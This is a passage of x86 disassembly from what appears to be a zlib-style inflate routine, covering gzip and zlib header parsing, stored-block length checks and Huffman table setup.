   1bab9:	mov    ecx,DWORD PTR [esi+0x30]
   1babc:	mov    edx,DWORD PTR [esi+0x28]
   1babf:	cmp    ecx,edx
   1bac1:	jne    0x1bac7
   1bac3:	and    DWORD PTR [esi+0x30],0x0
   1bac7:	mov    ecx,DWORD PTR [esi+0x2c]
   1baca:	cmp    ecx,edx
   1bacc:	jae    0x1bad3
   1bace:	add    ecx,eax
   1bad0:	mov    DWORD PTR [esi+0x2c],ecx
   1bad3:	xor    eax,eax
   1bad5:	pop    esi
   1bad6:	pop    ebx
   1bad7:	leave  
   1bad8:	ret    
   1bad9:	int3   
   1bada:	int3   
   1badb:	int3   
   1badc:	int3   
   1badd:	int3   
   1bade:	mov    edi,edi
   1bae0:	push   ebp
   1bae1:	mov    ebp,esp
   1bae3:	mov    edx,DWORD PTR [ebp+0x8]
   1bae6:	sub    esp,0x2c
   1bae9:	push   ebx
   1baea:	xor    eax,eax
   1baec:	push   esi
   1baed:	push   edi
   1baee:	cmp    edx,eax
   1baf0:	je     0x1bb40
   1baf2:	mov    esi,DWORD PTR [edx+0x1c]
   1baf5:	cmp    esi,eax
   1baf7:	je     0x1bb40
   1baf9:	cmp    DWORD PTR [edx+0xc],eax
   1bafc:	je     0x1bb40
   1bafe:	cmp    DWORD PTR [edx],eax
   1bb00:	jne    0x1bb07
   1bb02:	cmp    DWORD PTR [edx+0x4],eax
   1bb05:	jne    0x1bb40
   1bb07:	cmp    DWORD PTR [esi],0xb
   1bb0a:	jne    0x1bb12
   1bb0c:	mov    DWORD PTR [esi],0xc
   1bb12:	mov    eax,DWORD PTR [edx+0xc]
   1bb15:	mov    ecx,DWORD PTR [edx+0x10]
   1bb18:	and    DWORD PTR [ebp-0x24],0x0
   1bb1c:	mov    ebx,DWORD PTR [esi+0x38]
   1bb1f:	mov    edi,DWORD PTR [esi+0x3c]
   1bb22:	mov    DWORD PTR [ebp-0x18],eax
   1bb25:	mov    eax,DWORD PTR [edx]
   1bb27:	mov    DWORD PTR [ebp-0x4],eax
   1bb2a:	mov    eax,DWORD PTR [edx+0x4]
   1bb2d:	mov    DWORD PTR [ebp-0x8],eax
   1bb30:	mov    DWORD PTR [ebp-0x2c],eax
   1bb33:	mov    eax,DWORD PTR [esi]
   1bb35:	mov    DWORD PTR [ebp-0x10],ecx
   1bb38:	mov    DWORD PTR [ebp-0x1c],ecx
   1bb3b:	cmp    eax,0x1c
   1bb3e:	jbe    0x1bb4d
   1bb40:	push   0xfffffffe
   1bb42:	pop    eax
   1bb43:	pop    edi
   1bb44:	pop    esi
   1bb45:	pop    ebx
   1bb46:	leave  
   1bb47:	ret    0x8
   1bb4a:	mov    edx,DWORD PTR [ebp+0x8]
   1bb4d:	jmp    DWORD PTR [eax*4+0x1cc82]
   1bb54:	mov    eax,DWORD PTR [esi+0x8]
   1bb57:	test   eax,eax
   1bb59:	jne    0x1bb85
   1bb5b:	mov    DWORD PTR [esi],0xc
   1bb61:	jmp    0x1cb53
   1bb66:	cmp    DWORD PTR [ebp-0x8],0x0
   1bb6a:	je     0x1cba1
   1bb70:	mov    ecx,DWORD PTR [ebp-0x4]
   1bb73:	movzx  edx,BYTE PTR [ecx]
   1bb76:	dec    DWORD PTR [ebp-0x8]
   1bb79:	mov    ecx,edi
   1bb7b:	shl    edx,cl
   1bb7d:	add    ebx,edx
   1bb7f:	inc    DWORD PTR [ebp-0x4]
   1bb82:	add    edi,0x8
   1bb85:	cmp    edi,0x10
   1bb88:	jb     0x1bb66
   1bb8a:	test   al,0x2
   1bb8c:	je     0x1bbc9
   1bb8e:	cmp    ebx,0x8b1f
   1bb94:	jne    0x1bbc9
   1bb96:	xor    edi,edi
   1bb98:	push   edi
   1bb99:	push   edi
   1bb9a:	push   edi
   1bb9b:	call   0x1da04
   1bba0:	mov    DWORD PTR [esi+0x18],eax
   1bba3:	push   0x2
   1bba5:	lea    eax,[ebp-0x14]
   1bba8:	push   eax
   1bba9:	mov    BYTE PTR [ebp-0x14],0x1f
   1bbad:	mov    BYTE PTR [ebp-0x13],0x8b
   1bbb1:	push   DWORD PTR [esi+0x18]
   1bbb4:	call   0x1da04
   1bbb9:	mov    DWORD PTR [esi+0x18],eax
   1bbbc:	xor    ebx,ebx
   1bbbe:	mov    DWORD PTR [esi],0x1
   1bbc4:	jmp    0x1cb53
   1bbc9:	mov    eax,DWORD PTR [esi+0x20]
   1bbcc:	and    DWORD PTR [esi+0x10],0x0
   1bbd0:	test   eax,eax
   1bbd2:	je     0x1bbd8
   1bbd4:	or     DWORD PTR [eax+0x30],0xffffffff
   1bbd8:	test   BYTE PTR [esi+0x8],0x1
   1bbdc:	je     0x1bc62
   1bbe2:	movzx  eax,bl
   1bbe5:	shl    eax,0x8
   1bbe8:	mov    ecx,ebx
   1bbea:	shr    ecx,0x8
   1bbed:	add    eax,ecx
   1bbef:	push   0x1f
   1bbf1:	xor    edx,edx
   1bbf3:	pop    ecx
   1bbf4:	div    ecx
   1bbf6:	test   edx,edx
   1bbf8:	jne    0x1bc62
   1bbfa:	mov    eax,ebx
   1bbfc:	and    al,0xf
   1bbfe:	cmp    al,0x8
   1bc00:	je     0x1bc11
   1bc02:	mov    eax,DWORD PTR [ebp+0x8]
   1bc05:	mov    DWORD PTR [eax+0x18],0x1ee20
   1bc0c:	jmp    0x1cb4d
   1bc11:	shr    ebx,0x4
   1bc14:	mov    ecx,ebx
   1bc16:	and    ecx,0xf
   1bc19:	add    ecx,0x8
   1bc1c:	sub    edi,0x4
   1bc1f:	cmp    ecx,DWORD PTR [esi+0x24]
   1bc22:	jbe    0x1bc33
   1bc24:	mov    eax,DWORD PTR [ebp+0x8]
   1bc27:	mov    DWORD PTR [eax+0x18],0x1ee0c
   1bc2e:	jmp    0x1cb4d
   1bc33:	xor    eax,eax
   1bc35:	xor    edi,edi
   1bc37:	inc    eax
   1bc38:	push   edi
   1bc39:	shl    eax,cl
   1bc3b:	push   edi
   1bc3c:	push   edi
   1bc3d:	mov    DWORD PTR [esi+0x14],eax
   1bc40:	call   0x1d562
   1bc45:	mov    ecx,DWORD PTR [ebp+0x8]
   1bc48:	shr    ebx,0x8
   1bc4b:	not    ebx
   1bc4d:	and    ebx,0x2
   1bc50:	or     ebx,0x9
   1bc53:	mov    DWORD PTR [esi+0x18],eax
   1bc56:	mov    DWORD PTR [ecx+0x30],eax
   1bc59:	mov    DWORD PTR [esi],ebx
   1bc5b:	xor    ebx,ebx
   1bc5d:	jmp    0x1cb53
   1bc62:	mov    eax,DWORD PTR [ebp+0x8]
   1bc65:	mov    DWORD PTR [eax+0x18],0x1edf4
   1bc6c:	jmp    0x1cb4d
   1bc71:	cmp    edi,0x10
   1bc74:	jae    0x1bc9d
   1bc76:	cmp    DWORD PTR [ebp-0x8],0x0
   1bc7a:	je     0x1cba1
   1bc80:	mov    eax,DWORD PTR [ebp-0x4]
   1bc83:	movzx  eax,BYTE PTR [eax]
   1bc86:	dec    DWORD PTR [ebp-0x8]
   1bc89:	mov    ecx,edi
   1bc8b:	shl    eax,cl
   1bc8d:	add    edi,0x8
   1bc90:	add    ebx,eax
   1bc92:	inc    DWORD PTR [ebp-0x4]
   1bc95:	cmp    edi,0x10
   1bc98:	jb     0x1bc76
   1bc9a:	mov    edx,DWORD PTR [ebp+0x8]
   1bc9d:	mov    DWORD PTR [esi+0x10],ebx
   1bca0:	cmp    bl,0x8
   1bca3:	je     0x1bcb1
   1bca5:	mov    DWORD PTR [edx+0x18],0x1ee20
   1bcac:	jmp    0x1cb4d
   1bcb1:	test   ebx,0xe000
   1bcb7:	je     0x1bcc5
   1bcb9:	mov    DWORD PTR [edx+0x18],0x1edda
   1bcc0:	jmp    0x1cb4d
   1bcc5:	mov    eax,DWORD PTR [esi+0x20]
   1bcc8:	test   eax,eax
   1bcca:	je     0x1bcd6
   1bccc:	mov    ecx,ebx
   1bcce:	shr    ecx,0x8
   1bcd1:	and    ecx,0x1
   1bcd4:	mov    DWORD PTR [eax],ecx
   1bcd6:	test   DWORD PTR [esi+0x10],0x200
   1bcdd:	je     0x1bcfc
   1bcdf:	mov    BYTE PTR [ebp-0x14],bl
   1bce2:	push   0x2
   1bce4:	lea    eax,[ebp-0x14]
   1bce7:	shr    ebx,0x8
   1bcea:	push   eax
   1bceb:	mov    BYTE PTR [ebp-0x13],bl
   1bcee:	push   DWORD PTR [esi+0x18]
   1bcf1:	call   0x1da04
   1bcf6:	mov    edx,DWORD PTR [ebp+0x8]
   1bcf9:	mov    DWORD PTR [esi+0x18],eax
   1bcfc:	xor    ebx,ebx
   1bcfe:	xor    edi,edi
   1bd00:	mov    DWORD PTR [esi],0x2
   1bd06:	cmp    edi,0x20
   1bd09:	jae    0x1bd32
   1bd0b:	cmp    DWORD PTR [ebp-0x8],0x0
   1bd0f:	je     0x1cba1
   1bd15:	mov    eax,DWORD PTR [ebp-0x4]
   1bd18:	movzx  eax,BYTE PTR [eax]
   1bd1b:	dec    DWORD PTR [ebp-0x8]
   1bd1e:	mov    ecx,edi
   1bd20:	shl    eax,cl
   1bd22:	add    edi,0x8
   1bd25:	add    ebx,eax
   1bd27:	inc    DWORD PTR [ebp-0x4]
   1bd2a:	cmp    edi,0x20
   1bd2d:	jb     0x1bd0b
   1bd2f:	mov    edx,DWORD PTR [ebp+0x8]
   1bd32:	mov    eax,DWORD PTR [esi+0x20]
   1bd35:	test   eax,eax
   1bd37:	je     0x1bd3c
   1bd39:	mov    DWORD PTR [eax+0x4],ebx
   1bd3c:	test   DWORD PTR [esi+0x10],0x200
   1bd43:	je     0x1bd72
   1bd45:	mov    eax,ebx
   1bd47:	shr    eax,0x8
   1bd4a:	mov    BYTE PTR [ebp-0x13],al
   1bd4d:	mov    eax,ebx
   1bd4f:	shr    eax,0x10
   1bd52:	mov    BYTE PTR [ebp-0x12],al
   1bd55:	mov    BYTE PTR [ebp-0x14],bl
   1bd58:	push   0x4
   1bd5a:	lea    eax,[ebp-0x14]
   1bd5d:	shr    ebx,0x18
   1bd60:	push   eax
   1bd61:	mov    BYTE PTR [ebp-0x11],bl
   1bd64:	push   DWORD PTR [esi+0x18]
   1bd67:	call   0x1da04
   1bd6c:	mov    edx,DWORD PTR [ebp+0x8]
   1bd6f:	mov    DWORD PTR [esi+0x18],eax
   1bd72:	xor    ebx,ebx
   1bd74:	xor    edi,edi
   1bd76:	mov    DWORD PTR [esi],0x3
   1bd7c:	cmp    edi,0x10
   1bd7f:	jae    0x1bda8
   1bd81:	cmp    DWORD PTR [ebp-0x8],0x0
   1bd85:	je     0x1cba1
   1bd8b:	mov    eax,DWORD PTR [ebp-0x4]
   1bd8e:	movzx  eax,BYTE PTR [eax]
   1bd91:	dec    DWORD PTR [ebp-0x8]
   1bd94:	mov    ecx,edi
   1bd96:	shl    eax,cl
   1bd98:	add    edi,0x8
   1bd9b:	add    ebx,eax
   1bd9d:	inc    DWORD PTR [ebp-0x4]
   1bda0:	cmp    edi,0x10
   1bda3:	jb     0x1bd81
   1bda5:	mov    edx,DWORD PTR [ebp+0x8]
   1bda8:	mov    eax,DWORD PTR [esi+0x20]
   1bdab:	test   eax,eax
   1bdad:	je     0x1bdc5
   1bdaf:	mov    ecx,ebx
   1bdb1:	and    ecx,0xff
   1bdb7:	mov    DWORD PTR [eax+0x8],ecx
   1bdba:	mov    ecx,DWORD PTR [esi+0x20]
   1bdbd:	mov    eax,ebx
   1bdbf:	shr    eax,0x8
   1bdc2:	mov    DWORD PTR [ecx+0xc],eax
   1bdc5:	test   DWORD PTR [esi+0x10],0x200
   1bdcc:	je     0x1bdeb
   1bdce:	mov    BYTE PTR [ebp-0x14],bl
   1bdd1:	push   0x2
   1bdd3:	lea    eax,[ebp-0x14]
   1bdd6:	shr    ebx,0x8
   1bdd9:	push   eax
   1bdda:	mov    BYTE PTR [ebp-0x13],bl
   1bddd:	push   DWORD PTR [esi+0x18]
   1bde0:	call   0x1da04
   1bde5:	mov    edx,DWORD PTR [ebp+0x8]
   1bde8:	mov    DWORD PTR [esi+0x18],eax
   1bdeb:	xor    ebx,ebx
   1bded:	xor    edi,edi
   1bdef:	mov    DWORD PTR [esi],0x4
   1bdf5:	test   DWORD PTR [esi+0x10],0x400
   1bdfc:	je     0x1be63
   1bdfe:	cmp    edi,0x10
   1be01:	jae    0x1be2a
   1be03:	cmp    DWORD PTR [ebp-0x8],0x0
   1be07:	je     0x1cba1
   1be0d:	mov    eax,DWORD PTR [ebp-0x4]
   1be10:	movzx  eax,BYTE PTR [eax]
   1be13:	dec    DWORD PTR [ebp-0x8]
   1be16:	mov    ecx,edi
   1be18:	shl    eax,cl
   1be1a:	add    edi,0x8
   1be1d:	add    ebx,eax
   1be1f:	inc    DWORD PTR [ebp-0x4]
   1be22:	cmp    edi,0x10
   1be25:	jb     0x1be03
   1be27:	mov    edx,DWORD PTR [ebp+0x8]
   1be2a:	mov    eax,DWORD PTR [esi+0x20]
   1be2d:	mov    DWORD PTR [esi+0x40],ebx
   1be30:	test   eax,eax
   1be32:	je     0x1be37
   1be34:	mov    DWORD PTR [eax+0x14],ebx
   1be37:	test   DWORD PTR [esi+0x10],0x200
   1be3e:	je     0x1be5d
   1be40:	mov    BYTE PTR [ebp-0x14],bl
   1be43:	push   0x2
   1be45:	lea    eax,[ebp-0x14]
   1be48:	shr    ebx,0x8
   1be4b:	push   eax
   1be4c:	mov    BYTE PTR [ebp-0x13],bl
   1be4f:	push   DWORD PTR [esi+0x18]
   1be52:	call   0x1da04
   1be57:	mov    edx,DWORD PTR [ebp+0x8]
   1be5a:	mov    DWORD PTR [esi+0x18],eax
   1be5d:	xor    ebx,ebx
   1be5f:	xor    edi,edi
   1be61:	jmp    0x1be6e
   1be63:	mov    eax,DWORD PTR [esi+0x20]
   1be66:	test   eax,eax
   1be68:	je     0x1be6e
   1be6a:	and    DWORD PTR [eax+0x10],0x0
   1be6e:	mov    DWORD PTR [esi],0x5
   1be74:	test   DWORD PTR [esi+0x10],0x400
   1be7b:	je     0x1bf05
   1be81:	mov    edx,DWORD PTR [esi+0x40]
   1be84:	mov    eax,DWORD PTR [ebp-0x8]
   1be87:	mov    DWORD PTR [ebp-0xc],edx
   1be8a:	cmp    edx,eax
   1be8c:	jbe    0x1be91
   1be8e:	mov    DWORD PTR [ebp-0xc],eax
   1be91:	cmp    DWORD PTR [ebp-0xc],0x0
   1be95:	je     0x1bef8
   1be97:	mov    ecx,DWORD PTR [esi+0x20]
   1be9a:	test   ecx,ecx
   1be9c:	je     0x1bed2
   1be9e:	mov    eax,DWORD PTR [ecx+0x10]
   1bea1:	mov    DWORD PTR [ebp-0x28],eax
   1bea4:	test   eax,eax
   1bea6:	je     0x1bed2
   1bea8:	mov    eax,DWORD PTR [ecx+0x14]
   1beab:	mov    ecx,DWORD PTR [ecx+0x18]
   1beae:	sub    eax,edx
   1beb0:	mov    edx,DWORD PTR [ebp-0xc]
   1beb3:	add    edx,eax
   1beb5:	cmp    edx,ecx
   1beb7:	jbe    0x1bebd
   1beb9:	sub    ecx,eax
   1bebb:	jmp    0x1bec0
   1bebd:	mov    ecx,DWORD PTR [ebp-0xc]
   1bec0:	push   ecx
   1bec1:	mov    ecx,DWORD PTR [ebp-0x28]
   1bec4:	push   DWORD PTR [ebp-0x4]
   1bec7:	add    ecx,eax
   1bec9:	push   ecx
   1beca:	call   0x1dac6
   1becf:	add    esp,0xc
   1bed2:	test   DWORD PTR [esi+0x10],0x200
   1bed9:	je     0x1beec
   1bedb:	push   DWORD PTR [ebp-0xc]
   1bede:	push   DWORD PTR [ebp-0x4]
   1bee1:	push   DWORD PTR [esi+0x18]
   1bee4:	call   0x1da04
   1bee9:	mov    DWORD PTR [esi+0x18],eax
   1beec:	mov    eax,DWORD PTR [ebp-0xc]
   1beef:	sub    DWORD PTR [ebp-0x8],eax
   1bef2:	add    DWORD PTR [ebp-0x4],eax
   1bef5:	sub    DWORD PTR [esi+0x40],eax
   1bef8:	cmp    DWORD PTR [esi+0x40],0x0
   1befc:	jne    0x1cba1
   1bf02:	mov    edx,DWORD PTR [ebp+0x8]
   1bf05:	and    DWORD PTR [esi+0x40],0x0
   1bf09:	mov    DWORD PTR [esi],0x6
   1bf0f:	test   DWORD PTR [esi+0x10],0x800
   1bf16:	je     0x1bf93
   1bf18:	cmp    DWORD PTR [ebp-0x8],0x0
   1bf1c:	je     0x1cba1
   1bf22:	xor    ecx,ecx
   1bf24:	mov    eax,DWORD PTR [ebp-0x4]
   1bf27:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bf2b:	inc    ecx
   1bf2c:	mov    DWORD PTR [ebp-0xc],ecx
   1bf2f:	mov    ecx,DWORD PTR [esi+0x20]
   1bf32:	mov    DWORD PTR [ebp-0x20],eax
   1bf35:	test   ecx,ecx
   1bf37:	je     0x1bf54
   1bf39:	mov    edx,DWORD PTR [ecx+0x1c]
   1bf3c:	mov    DWORD PTR [ebp-0x28],edx
   1bf3f:	test   edx,edx
   1bf41:	je     0x1bf54
   1bf43:	mov    edx,DWORD PTR [esi+0x40]
   1bf46:	cmp    edx,DWORD PTR [ecx+0x20]
   1bf49:	jae    0x1bf54
   1bf4b:	mov    ecx,DWORD PTR [ebp-0x28]
   1bf4e:	mov    BYTE PTR [ecx+edx*1],al
   1bf51:	inc    DWORD PTR [esi+0x40]
   1bf54:	test   eax,eax
   1bf56:	je     0x1bf60
   1bf58:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf5b:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bf5e:	jb     0x1bf24
   1bf60:	test   DWORD PTR [esi+0x10],0x200
   1bf67:	je     0x1bf7d
   1bf69:	push   DWORD PTR [ebp-0xc]
   1bf6c:	push   DWORD PTR [ebp-0x4]
   1bf6f:	push   DWORD PTR [esi+0x18]
   1bf72:	call   0x1da04
   1bf77:	mov    DWORD PTR [esi+0x18],eax
   1bf7a:	mov    eax,DWORD PTR [ebp-0x20]
   1bf7d:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf80:	sub    DWORD PTR [ebp-0x8],ecx
   1bf83:	add    DWORD PTR [ebp-0x4],ecx
   1bf86:	test   eax,eax
   1bf88:	jne    0x1cba1
   1bf8e:	mov    edx,DWORD PTR [ebp+0x8]
   1bf91:	jmp    0x1bf9e
   1bf93:	mov    eax,DWORD PTR [esi+0x20]
   1bf96:	test   eax,eax
   1bf98:	je     0x1bf9e
   1bf9a:	and    DWORD PTR [eax+0x1c],0x0
   1bf9e:	and    DWORD PTR [esi+0x40],0x0
   1bfa2:	mov    DWORD PTR [esi],0x7
   1bfa8:	test   DWORD PTR [esi+0x10],0x1000
   1bfaf:	je     0x1c02c
   1bfb1:	cmp    DWORD PTR [ebp-0x8],0x0
   1bfb5:	je     0x1cba1
   1bfbb:	xor    ecx,ecx
   1bfbd:	mov    eax,DWORD PTR [ebp-0x4]
   1bfc0:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bfc4:	inc    ecx
   1bfc5:	mov    DWORD PTR [ebp-0xc],ecx
   1bfc8:	mov    ecx,DWORD PTR [esi+0x20]
   1bfcb:	mov    DWORD PTR [ebp-0x20],eax
   1bfce:	test   ecx,ecx
   1bfd0:	je     0x1bfed
   1bfd2:	mov    edx,DWORD PTR [ecx+0x24]
   1bfd5:	mov    DWORD PTR [ebp-0x28],edx
   1bfd8:	test   edx,edx
   1bfda:	je     0x1bfed
   1bfdc:	mov    edx,DWORD PTR [esi+0x40]
   1bfdf:	cmp    edx,DWORD PTR [ecx+0x28]
   1bfe2:	jae    0x1bfed
   1bfe4:	mov    ecx,DWORD PTR [ebp-0x28]
   1bfe7:	mov    BYTE PTR [ecx+edx*1],al
   1bfea:	inc    DWORD PTR [esi+0x40]
   1bfed:	test   eax,eax
   1bfef:	je     0x1bff9
   1bff1:	mov    ecx,DWORD PTR [ebp-0xc]
   1bff4:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bff7:	jb     0x1bfbd
   1bff9:	test   DWORD PTR [esi+0x10],0x200
   1c000:	je     0x1c016
   1c002:	push   DWORD PTR [ebp-0xc]
   1c005:	push   DWORD PTR [ebp-0x4]
   1c008:	push   DWORD PTR [esi+0x18]
   1c00b:	call   0x1da04
   1c010:	mov    DWORD PTR [esi+0x18],eax
   1c013:	mov    eax,DWORD PTR [ebp-0x20]
   1c016:	mov    ecx,DWORD PTR [ebp-0xc]
   1c019:	sub    DWORD PTR [ebp-0x8],ecx
   1c01c:	add    DWORD PTR [ebp-0x4],ecx
   1c01f:	test   eax,eax
   1c021:	jne    0x1cba1
   1c027:	mov    edx,DWORD PTR [ebp+0x8]
   1c02a:	jmp    0x1c037
   1c02c:	mov    eax,DWORD PTR [esi+0x20]
   1c02f:	test   eax,eax
   1c031:	je     0x1c037
   1c033:	and    DWORD PTR [eax+0x24],0x0
   1c037:	mov    DWORD PTR [esi],0x8
   1c03d:	test   DWORD PTR [esi+0x10],0x200
   1c044:	je     0x1c08a
   1c046:	cmp    edi,0x10
   1c049:	jae    0x1c072
   1c04b:	cmp    DWORD PTR [ebp-0x8],0x0
   1c04f:	je     0x1cba1
   1c055:	mov    eax,DWORD PTR [ebp-0x4]
   1c058:	movzx  eax,BYTE PTR [eax]
   1c05b:	dec    DWORD PTR [ebp-0x8]
   1c05e:	mov    ecx,edi
   1c060:	shl    eax,cl
   1c062:	add    edi,0x8
   1c065:	add    ebx,eax
   1c067:	inc    DWORD PTR [ebp-0x4]
   1c06a:	cmp    edi,0x10
   1c06d:	jb     0x1c04b
   1c06f:	mov    edx,DWORD PTR [ebp+0x8]
   1c072:	movzx  eax,WORD PTR [esi+0x18]
   1c076:	cmp    ebx,eax
   1c078:	je     0x1c086
   1c07a:	mov    DWORD PTR [edx+0x18],0x1edc6
   1c081:	jmp    0x1cb4d
   1c086:	xor    ebx,ebx
   1c088:	xor    edi,edi
   1c08a:	mov    eax,DWORD PTR [esi+0x20]
   1c08d:	test   eax,eax
   1c08f:	je     0x1c0a5
   1c091:	mov    edx,DWORD PTR [esi+0x10]
   1c094:	xor    ecx,ecx
   1c096:	inc    ecx
   1c097:	sar    edx,0x9
   1c09a:	and    edx,ecx
   1c09c:	mov    DWORD PTR [eax+0x2c],edx
   1c09f:	mov    eax,DWORD PTR [esi+0x20]
   1c0a2:	mov    DWORD PTR [eax+0x30],ecx
   1c0a5:	xor    eax,eax
   1c0a7:	push   eax
   1c0a8:	push   eax
   1c0a9:	push   eax
   1c0aa:	call   0x1da04
   1c0af:	mov    ecx,DWORD PTR [ebp+0x8]
   1c0b2:	mov    DWORD PTR [esi+0x18],eax
   1c0b5:	mov    DWORD PTR [ecx+0x30],eax
   1c0b8:	jmp    0x1c7b6
   1c0bd:	cmp    edi,0x20
   1c0c0:	jae    0x1c0e9
   1c0c2:	cmp    DWORD PTR [ebp-0x8],0x0
   1c0c6:	je     0x1cba1
   1c0cc:	mov    eax,DWORD PTR [ebp-0x4]
   1c0cf:	movzx  eax,BYTE PTR [eax]
   1c0d2:	dec    DWORD PTR [ebp-0x8]
   1c0d5:	mov    ecx,edi
   1c0d7:	shl    eax,cl
   1c0d9:	add    edi,0x8
   1c0dc:	add    ebx,eax
   1c0de:	inc    DWORD PTR [ebp-0x4]
   1c0e1:	cmp    edi,0x20
   1c0e4:	jb     0x1c0c2
   1c0e6:	mov    edx,DWORD PTR [ebp+0x8]
   1c0e9:	mov    ecx,ebx
   1c0eb:	mov    eax,0xff00
   1c0f0:	and    ecx,eax
   1c0f2:	mov    edi,ebx
   1c0f4:	shl    edi,0x10
   1c0f7:	add    ecx,edi
   1c0f9:	mov    edi,ebx
   1c0fb:	shr    edi,0x8
   1c0fe:	and    edi,eax
   1c100:	shl    ecx,0x8
   1c103:	shr    ebx,0x18
   1c106:	add    ecx,edi
   1c108:	lea    eax,[ecx+ebx*1]
   1c10b:	mov    DWORD PTR [esi+0x18],eax
   1c10e:	mov    DWORD PTR [edx+0x30],eax
   1c111:	xor    ebx,ebx
   1c113:	xor    edi,edi
   1c115:	mov    DWORD PTR [esi],0xa
   1c11b:	cmp    DWORD PTR [esi+0xc],0x0
   1c11f:	je     0x1cb63
   1c125:	xor    eax,eax
   1c127:	push   eax
   1c128:	push   eax
   1c129:	push   eax
   1c12a:	call   0x1d562
   1c12f:	mov    ecx,DWORD PTR [ebp+0x8]
   1c132:	mov    DWORD PTR [esi+0x18],eax
   1c135:	mov    DWORD PTR [ecx+0x30],eax
   1c138:	mov    DWORD PTR [esi],0xb
   1c13e:	cmp    DWORD PTR [ebp+0xc],0x5
   1c142:	je     0x1cba1
   1c148:	mov    edx,DWORD PTR [ebp+0x8]
   1c14b:	cmp    DWORD PTR [esi+0x4],0x0
   1c14f:	je     0x1c165
   1c151:	mov    ecx,edi
   1c153:	and    ecx,0x7
   1c156:	shr    ebx,cl
   1c158:	sub    edi,ecx
   1c15a:	mov    DWORD PTR [esi],0x18
   1c160:	jmp    0x1cb53
   1c165:	cmp    edi,0x3
   1c168:	jae    0x1c191
   1c16a:	cmp    DWORD PTR [ebp-0x8],0x0
   1c16e:	je     0x1cba1
   1c174:	mov    eax,DWORD PTR [ebp-0x4]
   1c177:	movzx  eax,BYTE PTR [eax]
   1c17a:	dec    DWORD PTR [ebp-0x8]
   1c17d:	mov    ecx,edi
   1c17f:	shl    eax,cl
   1c181:	add    edi,0x8
   1c184:	add    ebx,eax
   1c186:	inc    DWORD PTR [ebp-0x4]
   1c189:	cmp    edi,0x3
   1c18c:	jb     0x1c16a
   1c18e:	mov    edx,DWORD PTR [ebp+0x8]
   1c191:	mov    eax,ebx
   1c193:	and    eax,0x1
   1c196:	shr    ebx,1
   1c198:	mov    DWORD PTR [esi+0x4],eax
   1c19b:	mov    eax,ebx
   1c19d:	and    eax,0x3
   1c1a0:	dec    edi
   1c1a1:	sub    eax,0x0
   1c1a4:	je     0x1c1ea
   1c1a6:	dec    eax
   1c1a7:	je     0x1c1c6
   1c1a9:	dec    eax
   1c1aa:	je     0x1c1be
   1c1ac:	dec    eax
   1c1ad:	jne    0x1c1f0
   1c1af:	mov    DWORD PTR [edx+0x18],0x1edb2
   1c1b6:	mov    DWORD PTR [esi],0x1b
   1c1bc:	jmp    0x1c1f0
   1c1be:	mov    DWORD PTR [esi],0xf
   1c1c4:	jmp    0x1c1f0
   1c1c6:	mov    DWORD PTR [esi+0x4c],0x7b650
   1c1cd:	mov    DWORD PTR [esi+0x54],0x9
   1c1d4:	mov    DWORD PTR [esi+0x50],0x7be50
   1c1db:	mov    DWORD PTR [esi+0x58],0x5
   1c1e2:	mov    DWORD PTR [esi],0x12
   1c1e8:	jmp    0x1c1f0
   1c1ea:	mov    DWORD PTR [esi],0xd
   1c1f0:	shr    ebx,0x2
   1c1f3:	dec    edi
   1c1f4:	dec    edi
   1c1f5:	jmp    0x1cb53
   1c1fa:	mov    ecx,edi
   1c1fc:	and    ecx,0x7
   1c1ff:	sub    edi,ecx
   1c201:	shr    ebx,cl
   1c203:	cmp    edi,0x20
   1c206:	jae    0x1c22f
   1c208:	cmp    DWORD PTR [ebp-0x8],0x0
   1c20c:	je     0x1cba1
   1c212:	mov    eax,DWORD PTR [ebp-0x4]
   1c215:	movzx  eax,BYTE PTR [eax]
   1c218:	dec    DWORD PTR [ebp-0x8]
   1c21b:	mov    ecx,edi
   1c21d:	shl    eax,cl
   1c21f:	add    edi,0x8
   1c222:	add    ebx,eax
   1c224:	inc    DWORD PTR [ebp-0x4]
   1c227:	cmp    edi,0x20
   1c22a:	jb     0x1c208
   1c22c:	mov    edx,DWORD PTR [ebp+0x8]
   1c22f:	mov    ecx,ebx
   1c231:	mov    eax,ebx
   1c233:	not    ecx
   1c235:	and    eax,0xffff
   1c23a:	shr    ecx,0x10
   1c23d:	cmp    eax,ecx
   1c23f:	je     0x1c24d
   1c241:	mov    DWORD PTR [edx+0x18],0x1ed94
   1c248:	jmp    0x1cb4d
   1c24d:	xor    ebx,ebx
   1c24f:	mov    DWORD PTR [esi+0x40],eax
   1c252:	xor    edi,edi
   1c254:	mov    DWORD PTR [esi],0xe
   1c25a:	mov    eax,DWORD PTR [esi+0x40]
   1c25d:	mov    DWORD PTR [ebp-0xc],eax
   1c260:	test   eax,eax
   1c262:	je     0x1c7b6
   1c268:	mov    eax,DWORD PTR [ebp-0x8]
   1c26b:	cmp    DWORD PTR [ebp-0xc],eax
   1c26e:	jbe    0x1c273
   1c270:	mov    DWORD PTR [ebp-0xc],eax
   1c273:	mov    eax,DWORD PTR [ebp-0x10]
   1c276:	cmp    DWORD PTR [ebp-0xc],eax
   1c279:	jbe    0x1c27e
   1c27b:	mov    DWORD PTR [ebp-0xc],eax
   1c27e:	cmp    DWORD PTR [ebp-0xc],0x0
   1c282:	je     0x1cba1
   1c288:	push   DWORD PTR [ebp-0xc]
   1c28b:	push   DWORD PTR [ebp-0x4]
   1c28e:	push   DWORD PTR [ebp-0x18]
   1c291:	call   0x1dac6
   1c296:	mov    eax,DWORD PTR [ebp-0xc]
   1c299:	sub    DWORD PTR [ebp-0x8],eax
   1c29c:	add    DWORD PTR [ebp-0x4],eax
   1c29f:	sub    DWORD PTR [ebp-0x10],eax
   1c2a2:	add    DWORD PTR [ebp-0x18],eax
   1c2a5:	add    esp,0xc
   1c2a8:	sub    DWORD PTR [esi+0x40],eax
   1c2ab:	jmp    0x1cb53
   1c2b0:	cmp    edi,0xe
   1c2b3:	jae    0x1c2dc
   1c2b5:	cmp    DWORD PTR [ebp-0x8],0x0
   1c2b9:	je     0x1cba1
   1c2bf:	mov    eax,DWORD PTR [ebp-0x4]
   1c2c2:	movzx  eax,BYTE PTR [eax]
   1c2c5:	dec    DWORD PTR [ebp-0x8]
   1c2c8:	mov    ecx,edi
   1c2ca:	shl    eax,cl
   1c2cc:	add    edi,0x8
